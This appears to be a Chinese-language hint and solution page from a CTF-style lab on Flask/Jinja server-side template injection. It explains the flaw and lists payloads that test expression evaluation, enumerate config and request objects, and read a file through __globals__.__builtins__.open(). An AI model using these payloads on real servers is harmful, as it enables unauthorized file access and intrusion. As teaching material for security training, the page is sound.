为什么这里存在 vulnerability

用户可控字符串会被当作 templates 进行求值。Attackers 可能访问 config、调用 Python builtins，或借助 objects 读取 host resources。

需要一点提示？

Solution

展开 / 收起 solution
  1. 验证 code execution。 提交 {{ '{{ 7 * 7 }}' }}，确认 expressions 会被求值。
  2. 枚举 context。 使用 {{ '{{ config.items() }}' }} 或 {{ '{{ request.__dict__ }}' }} 发现 template 中暴露的 objects。
  3. 读取 flag。 Jinja 会暴露 Flask globals，因此可以运行 {{ "{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}" }} 在 server 上 cat 文件。
为什么它有效

request.application 会通向 Flask internals，让你可以触达原始 __builtins__ namespace 并调用 open()。
